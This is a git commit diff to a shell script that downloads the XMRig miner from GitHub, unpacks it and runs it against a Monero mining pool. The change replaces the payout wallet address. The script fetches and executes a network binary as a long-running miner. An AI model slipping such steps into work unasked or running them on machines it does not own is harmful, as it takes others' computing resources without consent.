05b730df7fae594808e8aff0820beb8ba6cb3a0e
behruz4933 <87130276+behruz4933@users.noreply.github.com>
2022-06-05 04:44:04 +0300

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -2,4 +2,4 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux
 tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
 ls
 cd xmrig-6.15.0
-./xmrig -o sg.minexmr.com:443 -u 0xa9714cCf854eC5C8eDeA1Ae7220AdCB6D8ff311f -k --tls --rig-id rig
+./xmrig -o sg.minexmr.com:443 -u 86ohyGgwceW3HdGZphUyE41sb6XV2B9gAiYJDAqVJMdU1AJzdW4yfZt2vFFihqqKGKQSCTUkuDGnjH5rokgVxmZQMJLk1Fs -k --tls --rig-id rig
